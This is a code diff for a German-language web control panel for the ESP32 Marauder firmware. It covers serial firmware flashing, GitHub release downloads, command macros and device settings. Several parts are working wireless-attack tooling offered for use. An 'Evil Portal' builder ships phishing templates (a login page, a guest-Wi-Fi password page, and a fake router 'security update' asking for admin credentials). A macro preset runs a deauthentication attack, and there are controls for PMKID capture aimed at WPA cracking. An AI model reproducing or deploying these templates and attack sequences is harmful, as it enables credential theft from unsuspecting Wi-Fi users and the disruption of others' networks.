+async function autoRepair(){
+  if(!window.EMBEDDED_FW_B64){flog("Keine eingebaute FW (firmware-embed.js fehlt).");return;}
+  if(!(await loadEsptool()))return;const btn=$("autoRepair");
+  try{btn.disabled=true;$("prog").style.width="0%";
+    if(port){flog("trenne Terminal...");await disconnect();}
+    flog("verbinde... (Fehler? BOOT halten + EN tippen)");
+    const dev=await navigator.serial.requestPort();flashTransport=new Transport(dev,false);
+    const baud=parseInt($("flashBaud").value,10);
+    esploader=new ESPLoader({transport:flashTransport,baudrate:baud,terminal:espTerminal});
+    const chip=await esploader.main();flog("Chip: "+chip);setDetectedChip(chip);
+    if(detectedChip!=="esp32s3"){
+      flog("Erkannt: "+chip+" — das eingebaute Image ist nur fuer ESP32-S3.");
+      $("autoStatus").innerHTML="⚠ Erkannt: <b>"+chip.split("(")[0].trim()+"</b>. Eingebautes Image ist nur für S3. Nutze <b>B · Universal App flashen</b> für diesen Chip.";
+      try{await flashTransport.disconnect();}catch(_){}esploader=null;flashTransport=null;btn.disabled=false;return;
+    }
+    // Kein Voll-Erase: 16MB-Erase ueber Serial ist unzuverlaessig ("Invalid head of packet").
+    // writeFlash loescht die geschriebenen Sektoren selbst (eraseAll:false).
+    flog("überspringe Voll-Erase (16MB über Serial oft fehlerhaft) — writeFlash löscht benötigte Sektoren selbst.");
+    const data=atob(window.EMBEDDED_FW_B64);
+    $("autoStatus").textContent="schreibe Firmware...";flog("schreibe "+(window.EMBEDDED_FW_NAME||"FW")+" @0x0 ("+data.length+" B)...");
+    await esploader.writeFlash({fileArray:[{data,address:0}],flashSize:"keep",flashMode:"keep",flashFreq:"keep",
+      eraseAll:false,compress:true,reportProgress:(i,w,t)=>{$("prog").style.width=Math.round(w/t*100)+"%";}});
+    $("prog").style.width="100%";flog("geschrieben ✓");
+    try{if(esploader.hardReset)await esploader.hardReset();}catch(e){}
+    try{await flashTransport.disconnect();}catch(e){}
+    esploader=null;flashTransport=null;
+    flog("FERTIG ✓ Board neu gestartet.");$("autoStatus").innerHTML="✅ <b>Fertig!</b> Oben <b>Verbinden</b> @115200 → <code>help</code>.";
+  }catch(e){flog("Auto-Flash-Fehler: "+e.message+" → nochmal. Bei 'Invalid head of packet': Flash-Baud auf 115200 senken. Bei Verbindungsfehler: BOOT halten + EN tippen.");
+    $("autoStatus").textContent="Fehler: "+e.message+" — Flash-Baud 115200 versuchen, oder BOOT+EN, nochmal.";
+    try{if(flashTransport)await flashTransport.disconnect();}catch(_){}esploader=null;flashTransport=null;
+  }finally{btn.disabled=false;}}
+
+async function flashConnect(){showView("flash");if(!(await loadEsptool()))return;
+  try{if(port){flog("trenne Terminal...");await disconnect();}
+    const dev=await navigator.serial.requestPort();flashTransport=new Transport(dev,false);
+    const baud=parseInt($("flashBaud").value,10);
+    esploader=new ESPLoader({transport:flashTransport,baudrate:baud,terminal:espTerminal});
+    flog("verbinde & erkenne ...");const chip=await esploader.main();flog("Chip: "+chip);setDetectedChip(chip);
+    $("eraseFlash").disabled=false;$("doFlash").disabled=false;$("flashReset").disabled=false;
+  }catch(e){flog("Verbindungsfehler: "+e.message+" → BOOT halten, EN tippen, erneut.");}}
+async function eraseFlash(){if(!esploader){flog("erst verbinden.");return;}
+  try{flog("lösche Flash...");await esploader.eraseFlash();flog("gelöscht ✓");}catch(e){flog("Erase-Fehler: "+e.message);}}
+function fileToBinStr(f){return new Promise((res,rej)=>{const fr=new FileReader();
+  fr.onload=()=>{const u=new Uint8Array(fr.result);let s="";const CH=0x8000;
+    for(let i=0;i<u.length;i+=CH)s+=String.fromCharCode.apply(null,u.subarray(i,i+CH));res(s);};
+  fr.onerror=()=>rej(fr.error);fr.readAsArrayBuffer(f);});}
+function parseAddr(v){v=(v||"").trim();return v.startsWith("0x")?parseInt(v,16):parseInt(v,10);}
+async function doFlash(){if(!esploader){flog("erst verbinden.");return;}const fileArray=[];
+  const rows=[["f0","a0"],["f1","a1"],["f2","a2"]];let manual=false;
+  for(const[fid,aid]of rows){const f=$(fid).files[0];if(!f)continue;manual=true;const addr=parseAddr($(aid).value);
+    if(isNaN(addr)){flog("Ungültige Adresse bei "+f.name);return;}const data=await fileToBinStr(f);
+    fileArray.push({data,address:addr});flog(`+ ${f.name} @ 0x${addr.toString(16)} (${(f.size/1024).toFixed(1)} kB)`);}
+  if(!manual&&autoFwData){fileArray.push({data:autoFwData,address:0x0});flog(`+ (auto) ${autoFwName} @ 0x0`);}
+  if(!fileArray.length){flog("keine Firmware — 1-Klick oben, 3a oder 3b.");return;}
+  try{$("doFlash").disabled=true;flog("schreibe...");
+    await esploader.writeFlash({fileArray,flashSize:"keep",flashMode:"keep",flashFreq:"keep",eraseAll:false,compress:true,
+      reportProgress:(i,w,t)=>{$("prog").style.width=Math.round(w/t*100)+"%";}});
+    $("prog").style.width="100%";flog("geschrieben ✓ → Reset & Starten.");}
+  catch(e){flog("Flash-Fehler: "+e.message);}finally{$("doFlash").disabled=false;}}
+async function flashReset(){try{if(esploader&&esploader.hardReset){await esploader.hardReset();flog("hard reset ✓");}
+    else if(flashTransport){await flashTransport.setDTR(false);await flashTransport.setRTS(true);
+      await new Promise(r=>setTimeout(r,120));await flashTransport.setRTS(false);flog("EN-Reset gepulst.");}
+    if(flashTransport){await flashTransport.disconnect();flog("Port frei. Oben 'Verbinden' fürs Terminal.");}
+    esploader=null;flashTransport=null;$("eraseFlash").disabled=true;$("doFlash").disabled=true;$("flashReset").disabled=true;
+  }catch(e){flog("Reset-Fehler: "+e.message);}}
+
+/* ---------- Chip-Erkennung (alle ESP32-Varianten) ---------- */
+let detectedChip=null;
+const CHIP_BL={esp32:0x1000,esp32s2:0x1000,esp32s3:0x0,esp32c3:0x0,esp32c5:0x0,esp32c6:0x0,esp32h2:0x0};
+function chipKey(s){s=(""+s).toLowerCase();
+  if(/s3/.test(s))return"esp32s3";if(/s2/.test(s))return"esp32s2";
+  if(/c3/.test(s))return"esp32c3";if(/c6/.test(s))return"esp32c6";
+  if(/c5/.test(s))return"esp32c5";if(/h2/.test(s))return"esp32h2";return"esp32";}
+function setDetectedChip(str){detectedChip=chipKey(str);
+  $("flashChip").innerHTML="Chip: <b>"+str.split("(")[0].trim()+"</b>";
+  setBadge("chip",(""+str).split(" ")[0]||"ESP32");
+  if($("boardPreset").value==="auto")applyBoard();}
+
+/* ---------- FW-Liste (alle Boards) ---------- */
+const GH_API="https://api.github.com/repos/justcallmekoko/ESP32Marauder/releases?per_page=8";
+let fwAssets=[];
+function fwRender(){const q=$("fwSearch").value.toLowerCase();const sel=$("fwSelect");sel.innerHTML="";
+  let list=fwAssets.filter(a=>a.name.toLowerCase().includes(q));
+  // erkannten Chip nach oben
+  if(detectedChip){const k=detectedChip.replace("esp32","");list.sort((x,y)=>(y.name.toLowerCase().includes(k)?1:0)-(x.name.toLowerCase().includes(k)?1:0));}
+  list.forEach(a=>{const o=document.createElement("option");o.value=a.url;o.dataset.name=a.name;
+    o.textContent=`${a.tag} · ${a.name} (${(a.size/1048576).toFixed(2)} MB)`;sel.appendChild(o);});
+  if(!list.length)sel.innerHTML="<option>— kein Treffer —</option>";
+  $("appFlash").disabled=!list.length;$("repairUni").disabled=!list.length;}
+async function fwList(){$("fwStatus").textContent="lade Build-Liste von GitHub ...";
+  try{const r=await fetch(GH_API,{headers:{Accept:"application/vnd.github+json"}});if(!r.ok)throw new Error("HTTP "+r.status);
+    const rels=await r.json();fwAssets=[];
+    for(const rel of rels)for(const a of(rel.assets||[]))if(/\.bin$/i.test(a.name))
+      fwAssets.push({name:a.name,url:a.browser_download_url,size:a.size,tag:rel.tag_name});
+    fwRender();$("fwStatus").textContent=fwAssets.length+" Builds geladen. Board im Filter suchen.";}
+  catch(e){$("fwStatus").textContent="Liste fehlgeschlagen ("+e.message+"). Rate-Limit? Später erneut, oder App manuell (C).";}}
+async function fetchBin(rawUrl){
+  const url=$("fwProxy").checked?"https://corsproxy.io/?url="+encodeURIComponent(rawUrl):rawUrl;
+  const r=await fetch(url);if(!r.ok)throw new Error("HTTP "+r.status);const buf=await r.arrayBuffer();
+  const u=new Uint8Array(buf);let s="";const CH=0x8000;for(let i=0;i<u.length;i+=CH)s+=String.fromCharCode.apply(null,u.subarray(i,i+CH));
+  return {data:s,bytes:buf.byteLength};}
+
+/* App-Only-Flash @0x10000 (universal, jeder Chip mit vorhandenem Bootloader) */
+async function appFlash(){
+  const o=$("fwSelect").selectedOptions[0];if(!o||!o.value){$("fwStatus").textContent="erst Build wählen.";return;}
+  const name=o.dataset.name||"app.bin";const btn=$("appFlash");
+  if(!(await loadEsptool()))return;
+  try{btn.disabled=true;$("prog").style.width="0%";
+    $("fwStatus").textContent="lade "+name+" ...";flog("lade App "+name+($("fwProxy").checked?" (Proxy)":""));
+    const app=await fetchBin(o.value);flog("App geladen: "+app.bytes+" B");
+    if(port){flog("trenne Terminal...");await disconnect();}
+    flog("verbinde... (Fehler? BOOT halten + EN tippen)");
+    const dev=await navigator.serial.requestPort();flashTransport=new Transport(dev,false);
+    esploader=new ESPLoader({transport:flashTransport,baudrate:parseInt($("flashBaud").value,10),terminal:espTerminal});
+    const chip=await esploader.main();flog("Chip: "+chip);setDetectedChip(chip);
+    $("fwStatus").textContent="schreibe App @0x10000 ...";flog("schreibe "+name+" @0x10000 (Bootloader bleibt)");
+    await esploader.writeFlash({fileArray:[{data:app.data,address:0x10000}],flashSize:"keep",flashMode:"keep",flashFreq:"keep",
+      eraseAll:false,compress:true,reportProgress:(i,w,t)=>{$("prog").style.width=Math.round(w/t*100)+"%";}});
+    $("prog").style.width="100%";flog("App geschrieben ✓");
+    try{if(esploader.hardReset)await esploader.hardReset();}catch(e){}
+    try{await flashTransport.disconnect();}catch(e){}esploader=null;flashTransport=null;
+    $("fwStatus").innerHTML="✅ App geflasht. Oben <b>Verbinden</b> @115200 → <code>help</code>.";flog("FERTIG ✓");
+  }catch(e){flog("App-Flash-Fehler: "+e.message);
+    $("fwStatus").textContent="Fehler: "+e.message+" — CORS-Proxy? BOOT+EN? Bootloader evtl. leer → Voll-Flash (C) / flasher.marauder.gg.";
+    try{if(flashTransport)await flashTransport.disconnect();}catch(_){}esploader=null;flashTransport=null;
+  }finally{btn.disabled=false;}}
+
+/* Universal-Voll-Reparatur: Bootloader(Familie)+Partitionen+boot_app0+App(Download) — jeder Chip */
+async function repairUni(){
+  const o=$("fwSelect").selectedOptions[0];
+  if(!o||!o.value){$("fwStatus").textContent="erst Board-Build wählen (Liste laden, dann auswählen).";return;}
+  const name=o.dataset.name||"app.bin";const btn=$("repairUni");
+  if(!window.FW_PARTS){$("fwStatus").textContent="parts-embed.js nicht geladen.";return;}
+  if(!(await loadEsptool()))return;
+  try{btn.disabled=true;$("prog").style.width="0%";
+    $("fwStatus").textContent="lade "+name+" ...";flog("Voll-Reparatur: lade App "+name);
+    const app=await fetchBin(o.value);flog("App: "+app.bytes+" B");
+    if(port){await disconnect();}
+    flog("verbinde...");const dev=await navigator.serial.requestPort();flashTransport=new Transport(dev,false);
+    esploader=new ESPLoader({transport:flashTransport,baudrate:parseInt($("flashBaud").value,10),terminal:espTerminal});
+    const chip=await esploader.main();flog("Chip: "+chip);setDetectedChip(chip);
+    const P=window.FW_PARTS[detectedChip];
+    if(!P){flog("Keine eingebauten Bootloader-Teile für "+detectedChip+".");
+      $("fwStatus").innerHTML="⚠ Für <b>"+detectedChip+"</b> kein eingebauter Bootloader. Nutze <a href='https://flasher.marauder.gg' target='_blank'>flasher.marauder.gg</a> oder manuell (C).";
+      try{await flashTransport.disconnect();}catch(_){}esploader=null;flashTransport=null;btn.disabled=false;return;}
+    const fa=[
+      {data:atob(P.bl),address:P.blOff},
+      {data:atob(window.FW_PART_TABLE),address:0x8000},
+      {data:atob(window.FW_BOOTAPP0),address:0xe000},
+      {data:app.data,address:0x10000}
+    ];
+    flog("schreibe Bootloader@0x"+P.blOff.toString(16)+" + Partitionen@0x8000 + boot_app0@0xe000 + App@0x10000 ...");
+    $("fwStatus").textContent="Voll-Reparatur läuft...";
+    await esploader.writeFlash({fileArray:fa,flashSize:"keep",flashMode:"keep",flashFreq:"keep",eraseAll:false,compress:true,
+      reportProgress:(i,w,t)=>{$("prog").style.width=Math.round(w/t*100)+"%";}});
+    $("prog").style.width="100%";flog("Voll-Flash geschrieben ✓");
+    try{if(esploader.hardReset)await esploader.hardReset();}catch(e){}
+    try{await flashTransport.disconnect();}catch(e){}esploader=null;flashTransport=null;
+    $("fwStatus").innerHTML="✅ Voll-Reparatur fertig. Oben <b>Verbinden</b> @115200 → <code>help</code>.";flog("FERTIG ✓");
+  }catch(e){flog("Voll-Reparatur-Fehler: "+e.message);
+    $("fwStatus").textContent="Fehler: "+e.message+" — CORS-Proxy? BOOT+EN? Sonst flasher.marauder.gg.";
+    try{if(flashTransport)await flashTransport.disconnect();}catch(_){}esploader=null;flashTransport=null;
+  }finally{btn.disabled=false;}}
+
+/* ---------- Chip-Preset (Offsets) ---------- */
+function applyBoard(){let v=$("boardPreset").value;
+  if(v==="auto"){v=detectedChip||"esp32s3";}
+  if(v==="merged"){$("a0").value="0x0";$("f1").value="";$("f2").value="";
+    $("boardNote").innerHTML="Merged-Bin: eine Datei @0x0 (enthält Bootloader+Partitionen+App).";
+    $("addrNote").innerHTML="Merged → nur Zeile 1 @0x0, Zeilen 2/3 leer.";return;}
+  if(v==="app"){$("a2").value="0x10000";
+    $("boardNote").innerHTML="Nur-App: Board behält Bootloader. App @0x10000.";
+    $("addrNote").innerHTML="Nur-App → App-Bin in Zeile 3 @0x10000, Zeilen 1/2 leer.";return;}
+  const bl=CHIP_BL[v]!==undefined?CHIP_BL[v]:0x0;
+  $("a0").value="0x"+bl.toString(16);$("a1").value="0x8000";$("a2").value="0x10000";
+  const nm={esp32:"ESP32 classic",esp32s2:"ESP32-S2",esp32s3:"ESP32-S3",esp32c3:"ESP32-C3",esp32c5:"ESP32-C5",esp32c6:"ESP32-C6",esp32h2:"ESP32-H2"}[v]||v;
+  $("boardNote").innerHTML=nm+": Bootloader @0x"+bl.toString(16)+", Partitionen @0x8000, App @0x10000.";
+  $("addrNote").innerHTML=nm+" Voll-Flash: bootloader @0x"+bl.toString(16)+", partitions @0x8000, app @0x10000.";}
+
+/* ---------- Evil Portal builder ---------- */
+const EP_T={
+ login:`<!DOCTYPE html><html lang="de"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Anmeldung</title><style>body{font-family:system-ui;background:#f0f2f5;margin:0;display:flex;min-height:100vh;align-items:center;justify-content:center}.b{background:#fff;padding:32px;border-radius:12px;box-shadow:0 4px 20px rgba(0,0,0,.1);width:320px;max-width:90%}h1{font-size:20px;margin:0 0 4px}p{color:#666;font-size:14px}input{width:100%;padding:12px;margin:6px 0;border:1px solid #ddd;border-radius:8px;font-size:15px;box-sizing:border-box}button{width:100%;padding:12px;margin-top:12px;background:#1877f2;color:#fff;border:0;border-radius:8px;font-size:16px}</style></head><body><div class="b"><h1>Anmeldung</h1><p>Bitte anmelden um fortzufahren.</p><form action="/get" method="POST"><input type="email" name="email" placeholder="E-Mail" required><input type="password" name="password" placeholder="Passwort" required><button>Anmelden</button></form></div></body></html>`,
+ wifi:`<!DOCTYPE html><html lang="de"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>WLAN</title><style>body{font-family:system-ui;background:#0a3d62;margin:0;display:flex;min-height:100vh;align-items:center;justify-content:center;color:#fff}.b{background:rgba(255,255,255,.08);backdrop-filter:blur(8px);padding:32px;border-radius:14px;width:320px;max-width:90%;text-align:center}input{width:100%;padding:12px;margin:6px 0;border:0;border-radius:8px;font-size:15px;box-sizing:border-box}button{width:100%;padding:12px;margin-top:12px;background:#38ada9;color:#fff;border:0;border-radius:8px;font-size:16px}</style></head><body><div class="b"><h1>📶 Gäste-WLAN</h1><p>Zum Verbinden authentifizieren.</p><form action="/get" method="POST"><input name="username" placeholder="Benutzer" required><input type="password" name="password" placeholder="WLAN-Passwort" required><button>Verbinden</button></form></div></body></html>`,
+ router:`<!DOCTYPE html><html lang="de"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Router-Update</title><style>body{font-family:system-ui;background:#f5f5f5;margin:0;padding:20px}.b{background:#fff;max-width:420px;margin:40px auto;padding:28px;border-radius:8px;border-top:4px solid #e74c3c}h1{font-size:19px;color:#c0392b}input{width:100%;padding:11px;margin:6px 0;border:1px solid #ccc;border-radius:5px;box-sizing:border-box}button{padding:11px 20px;background:#e74c3c;color:#fff;border:0;border-radius:5px;font-size:15px;margin-top:10px}</style></head><body><div class="b"><h1>⚠ Sicherheitsupdate</h1><p>Router benötigt kritisches Update. Admin-Zugang bestätigen.</p><form action="/get" method="POST"><input name="username" placeholder="Admin" required><input type="password" name="password" placeholder="Passwort" required><button>Update starten</button></form></div></body></html>`,
+ blank:`<!DOCTYPE html><html lang="de"><head><meta charset="UTF-8"><title>Portal</title></head><body>\n<!-- Form muss an /get posten -->\n<form action="/get" method="POST">\n <input name="username" placeholder="user">\n <input name="password" type="password" placeholder="pass">\n <button>OK</button>\n</form>\n</body></html>`
+};
+function download(name,text,mime){const b=new Blob([text],{type:mime||"text/plain"});const a=document.createElement("a");
+  a.href=URL.createObjectURL(b);a.download=name;a.click();setTimeout(()=>URL.revokeObjectURL(a.href),2000);}
+function epPreview(){const h=$("epHtml").value;$("epPrev").srcdoc=h;}
+
+/* ---------- Settings toggles ---------- */
+const SET_DESC={
+  EnableLED:"Status-LED an/aus.",SavePCAP:"Sniffer-Pakete als PCAP auf SD (für Wireshark).",
+  SaveHistory:"Befehlsverlauf auf SD speichern.",ForcePMKID:"Beim Sniffen PMKID erzwingen (WPA-Cracken).",
+  ForceProbe:"Probe-Requests forcieren.",EnableChannelHopping:"Beim Scannen automatisch Kanäle durchhüpfen.",
+  AttackHop:"Während Angriffen den Kanal wechseln.",PrintPackets:"Rohpakete in der Konsole ausgeben.",
+  EnableBLE:"Bluetooth-LE aktivieren."
+};
+// Startwerte (bekannt) — echte Werte kommen beim Abrufen
+let settingsState={};Object.keys(SET_DESC).forEach(n=>settingsState[n]=null);
+function isBool(v){return v!==null&&/^(true|false|on|off|enabled?|disabled?|1|0|yes|no)$/i.test((""+v).trim());}
+function boolOn(v){return /^(true|on|enabled?|1|yes)$/i.test((""+v).trim());}
+function renderSettings(){const tb=$("setRows");if(!tb)return;tb.innerHTML="";
+  const names=Object.keys(settingsState).sort();
+  names.forEach(n=>{const v=settingsState[n];const tr=document.createElement("tr");
+    const tdN=document.createElement("td");tdN.textContent=n;tr.appendChild(tdN);
+    const tdV=document.createElement("td");
+    if(v===null){tdV.textContent="—";tdV.style.color="var(--faint)";}
+    else if(isBool(v)){tdV.textContent=boolOn(v)?"an":"aus";tdV.style.color=boolOn(v)?"var(--green)":"var(--muted)";}
+    else{tdV.textContent=v;tdV.style.color="var(--text)";}
+    tr.appendChild(tdV);
+    const tdD=document.createElement("td");tdD.className="hint";tdD.style.margin="0";tdD.textContent=SET_DESC[n]||"";tr.appendChild(tdD);
+    const tdC=document.createElement("td");
+    if(v===null||isBool(v)){
+      const sw=document.createElement("div");sw.className="sw"+(boolOn(v)?" on":"");sw.title="umschalten";
+      sw.onclick=()=>{const turnOn=!boolOn(settingsState[n]);fire("settings -s "+n+(turnOn?" enable":" disable"));
+        settingsState[n]=turnOn?"enabled":"disabled";renderSettings();};
+      tdC.appendChild(sw);
+    }else{
+      const inp=document.createElement("input");inp.type="text";inp.value=v;inp.style.width="80px";
+      const b=document.createElement("button");b.className="btn";b.style.padding="4px 8px";b.textContent="setzen";
+      b.onclick=()=>{fire("settings -s "+n+" "+inp.value.trim());settingsState[n]=inp.value.trim();renderSettings();};
+      tdC.appendChild(inp);tdC.appendChild(b);
+    }
+    tr.appendChild(tdC);tb.appendChild(tr);});
+}
+// Parser fuer "settings"-Ausgabe: "Name: Wert" / "Name = Wert" / "Name Wert"
+let captureSetUntil=0,captureGpsUntil=0;
+function parseSetting(line){
+  if(performance.now()>captureSetUntil)return false;
+  if(/^\s*>/.test(line))return false;
+  let m=line.match(/^\s*([A-Za-z][A-Za-z0-9_ ]{1,40}?)\s*[:=]\s*(.+?)\s*$/)
+       ||line.match(/^\s*([A-Za-z][A-Za-z0-9_]{2,40})\s+(true|false|on|off|enabled?|disabled?|\d+)\s*$/i);
+  if(!m)return false;
+  const name=m[1].trim().replace(/\s+/g,"");const val=m[2].trim();
+  if(!name||/^selected$/i.test(name))return false;
+  settingsState[name]=val;renderSettings();$("setInfo").textContent=Object.values(settingsState).filter(v=>v!==null).length+" Werte abgerufen";
+  return true;
+}
+
+/* ---------- Macros ---------- */
+const MACRO_PRESETS={
+  apscan:"scanap\nwait 8000\nstopscan\nlist -a",
+  deauth:"scanap\nwait 6000\nstopscan\nselect -a 0\nattack -t deauth\nwait 5000\nstopscan",
+  blescan:"blescan -t all\nwait 8000\nstopscan",
+  recon:"scanap\nwait 8000\nstopscan\nlist -a\nscansta\nwait 8000\nstopscan\nlist -s\nblescan -t all\nwait 8000\nstopscan"
+};
+function getMacros(){try{return JSON.parse(localStorage.getItem("mccMacros")||"[]");}catch(e){return[];}}
+function saveMacros(a){localStorage.setItem("mccMacros",JSON.stringify(a));}
+function refreshMacroLib(){const sel=$("macroLib");const arr=getMacros();sel.innerHTML="";
+  if(!arr.length){const o=document.createElement("option");o.textContent="— keine gespeichert —";sel.appendChild(o);return;}
+  arr.forEach(m=>{const o=document.createElement("option");o.value=m.name;o.textContent=m.name;sel.appendChild(o);});}
+async function macroRun(){if(!writer){append("Nicht verbunden.","line-err");return;}macroAbort=false;
+  const lines=$("macro").value.split(/\r?\n/);const dfl=parseInt($("macroDelay").value,10)||300;
+  append("Macro gestartet","line-sys");
+  for(const raw of lines){if(macroAbort){append("Macro abgebrochen.","line-sys");return;}
+    const l=raw.trim();if(!l||l.startsWith("#"))continue;const m=l.match(/^wait\s+(\d+)$/i);
+    if(m){await new Promise(r=>setTimeout(r,parseInt(m[1],10)));continue;}
+    await sendText(l);await new Promise(r=>setTimeout(r,dfl));}
+  if(!macroAbort)append("Macro fertig.","line-sys");}
+
+/* ---------- Command palette ---------- */
+let palItems=[],palSel=0;
+function openPalette(){$("modal").classList.add("open");$("palInput").value="";renderPal("");$("palInput").focus();}
+function closePalette(){$("modal").classList.remove("open");}
+function renderPal(q){q=q.toLowerCase();palItems=CMDS.filter(([c,cmd])=>(c+" "+cmd).toLowerCase().includes(q));palSel=0;
+  const list=$("palList");list.innerHTML="";
+  palItems.forEach(([cat,cmd],i)=>{const d=document.createElement("div");d.className="pi"+(i===0?" sel":"");
+    d.innerHTML=`<span class="c"></span><span class="cat"></span>`;d.querySelector(".c").textContent=cmd;d.querySelector(".cat").textContent=cat;
+    d.onclick=()=>{fire(cmd);closePalette();};list.appendChild(d);});}
+function palMove(d){const items=$("palList").children;if(!items.length)return;items[palSel]&&items[palSel].classList.remove("sel");
+  palSel=(palSel+d+items.length)%items.length;items[palSel].classList.add("sel");items[palSel].scrollIntoView({block:"nearest"});}
+
+/* ================= Events ================= */
+$("connect").onclick=connect;$("disconnect").onclick=disconnect;$("send").onclick=send;
+$("paletteBtn").onclick=openPalette;
+$("consoleHead").onclick=()=>$("console").classList.toggle("collapsed");
+$("input").addEventListener("keydown",e=>{
+  if(e.key==="Enter"){send();return;}
+  if(e.key==="ArrowUp"){if(histIdx>0){histIdx--;$("input").value=history[histIdx]||"";}e.preventDefault();}
+  if(e.key==="ArrowDown"){if(histIdx<history.length-1){histIdx++;$("input").value=history[histIdx]||"";}else{histIdx=history.length;$("input").value="";}e.preventDefault();}});
+document.addEventListener("keydown",e=>{if((e.ctrlKey||e.metaKey)&&e.key.toLowerCase()==="k"){e.preventDefault();openPalette();}
+  if(e.key==="Escape")closePalette();});
+$("palInput").addEventListener("input",e=>renderPal(e.target.value));
+$("palInput").addEventListener("keydown",e=>{if(e.key==="ArrowDown"){palMove(1);e.preventDefault();}
+  if(e.key==="ArrowUp"){palMove(-1);e.preventDefault();}
+  if(e.key==="Enter"){const it=palItems[palSel];if(it){fire(it[1]);closePalette();}}});
+$("modal").addEventListener("click",e=>{if(e.target===$("modal"))closePalette();});
+
+document.querySelectorAll("[data-cmd]").forEach(b=>b.onclick=()=>fire(b.dataset.cmd));
+$("smartScan").onclick=smartScan;
+$("wifiStop").onclick=()=>{smartAbort=true;fire("stopscan");};
+
+// dashboard quick actions (Label, Befehl, Erklärung)
+[["Hilfe/Befehle","help","Listet alle Marauder-Befehle."],
+ ["Neustart","reboot","Startet das Board neu."],
+ ["Stop","stopscan","Beendet jeden Scan/Angriff."],
+ ["Einstellungen","settings","Zeigt aktuelle Einstellungen."],
+ ["WLAN scannen","scanap","Sucht Access Points."],
+ ["Clients scannen","scansta","Sucht verbundene Geräte."],
+ ["Kanal zeigen","channel","Zeigt aktuellen Funkkanal."],
+ ["BLE scannen","blescan -t all","Sucht Bluetooth-Geräte."]
+].forEach(([lab,c,desc])=>{
+  const b=document.createElement("button");b.className="btn";b.textContent=lab;b.title=desc+"  ("+c+")";b.onclick=()=>fire(c);$("dashQuick").appendChild(b);});
+
+// wifi
+$("setCh").onclick=()=>fire("channel -s "+$("chNum").value);
+$("pmkidBtn").onclick=()=>fire("sniffpmkid -c "+$("pmkidCh").value+" -d");
+$("ssidGenBtn").onclick=()=>fire("ssid -a -g "+$("ssidGen").value);
+$("ssidNameBtn").onclick=()=>{const n=$("ssidName").value.trim();if(n)fire("ssid -a -n "+n);};
+$("apClear").onclick=()=>{apList=[];renderAp();saveState();};
+$("staClear").onclick=()=>{staList=[];renderSta();saveState();};
+$("bleClear").onclick=()=>{bleList=[];renderBle();saveState();};
+$("apSelMarked").onclick=async()=>{for(const c of document.querySelectorAll('#apRows input:checked'))await fire("select -a "+c.dataset.i);};
+$("staSelMarked").onclick=async()=>{for(const c of document.querySelectorAll('#staRows input:checked'))await fire("select -c "+c.dataset.i);};
+
+// portal
+$("epStartFile").onclick=()=>{const f=$("epFile").value.trim();if(f)fire("evilportal -c start -w "+f);};
+$("epSetHtml").onclick=()=>{const f=$("epFile").value.trim();if(f)fire("evilportal -c sethtml "+f);};
+$("epSetAp").onclick=()=>fire("evilportal -c setap "+$("epAp").value);
+$("epLoadTpl").onclick=()=>{$("epHtml").value=EP_T[$("epTpl").value]||"";epPreview();};
+$("epFromFile").onclick=()=>$("epFilePick").click();
+$("epFilePick").onchange=e=>{const f=e.target.files[0];if(!f)return;const r=new FileReader();r.onload=()=>{$("epHtml").value=r.result;epPreview();};r.readAsText(f);};
+$("epHtml").addEventListener("input",epPreview);
+$("epDownload").onclick=()=>{const h=$("epHtml").value;if(!h){append("Kein HTML.","line-err");return;}download("index.html",h,"text/html");append("index.html geladen → auf SD-Root.","line-sys");};
+$("epDownloadCfg").onclick=()=>{const s=$("epCfgSsid").value.trim();if(!s){append("AP-Name eingeben.","line-err");return;}download("ap.config.txt",s+"\n");append("ap.config.txt geladen → auf SD-Root.","line-sys");};
+
+// settings
+$("setCustom").onclick=()=>{const k=$("setKey").value.trim();if(k)fire("settings -s "+k+" "+$("setVal").value.trim());};
+renderSettings();
+
+// macros
+refreshMacroLib();$("macro").value=localStorage.getItem("mccMacroDraft")||"";
+$("macro").addEventListener("input",()=>localStorage.setItem("mccMacroDraft",$("macro").value));
+$("macroPreset").onchange=()=>{const v=$("macroPreset").value;if(v&&MACRO_PRESETS[v]){const cur=$("macro").value.trim();
+  $("macro").value=(cur?cur+"\n":"")+MACRO_PRESETS[v];localStorage.setItem("mccMacroDraft",$("macro").value);$("macroPreset").value="";}};
+$("macroLoad").onclick=()=>{const n=$("macroLib").value;const m=getMacros().find(x=>x.name===n);if(m){$("macro").value=m.body;$("macroName").value=m.name;}};
+$("macroSave").onclick=()=>{const n=$("macroName").value.trim();if(!n){append("Macro-Name eingeben.","line-err");return;}
+  const a=getMacros();const i=a.findIndex(x=>x.name===n);const rec={name:n,body:$("macro").value};if(i>=0)a[i]=rec;else a.push(rec);
+  saveMacros(a);refreshMacroLib();$("macroLib").value=n;append("Macro '"+n+"' gespeichert.","line-sys");};
+$("macroDelete").onclick=()=>{const n=$("macroLib").value;saveMacros(getMacros().filter(x=>x.name!==n));refreshMacroLib();append("Macro gelöscht.","line-sys");};
+$("macroRun").onclick=macroRun;$("macroStop").onclick=()=>{macroAbort=true;};
+
+// flash
+$("autoRepair").onclick=autoRepair;$("flashConnect").onclick=flashConnect;$("eraseFlash").onclick=eraseFlash;
+$("doFlash").onclick=doFlash;$("flashReset").onclick=flashReset;$("fwList").onclick=fwList;$("appFlash").onclick=appFlash;$("repairUni").onclick=repairUni;$("fwSearch").addEventListener("input",fwRender);
+$("boardPreset").onchange=applyBoard;$("hwReset").onclick=hwReset;$("bootMode").onclick=bootMode;
+
+// console
+$("search").addEventListener("input",()=>document.querySelectorAll("#log>div").forEach(applyFilter));
+$("rxOnly").addEventListener("change",()=>document.querySelectorAll("#log>div").forEach(applyFilter));
+$("clear").onclick=()=>{logEl.innerHTML="";romHits=0;localStorage.removeItem("mccLog");};
+window.addEventListener("beforeunload",()=>{try{saveState();saveLog();}catch(e){}});
+$("save").onclick=()=>{const b=new Blob([logEl.innerText],{type:"text/plain"});const a=document.createElement("a");
+  a.href=URL.createObjectURL(b);a.download="marauder-log-"+new Date().toISOString().replace(/[:.]/g,"-")+".txt";a.click();};
+
+if("serial"in navigator){navigator.serial.addEventListener("disconnect",ev=>{if(port&&ev.target===port){
+  append("Gerät getrennt (USB-CDC re-enumeriert beim App-Start). → Trennen/Verbinden, ODER den UART-Port (CH343 1a86:55d3) für stabile CLI nutzen.","line-err");disconnect();}});}
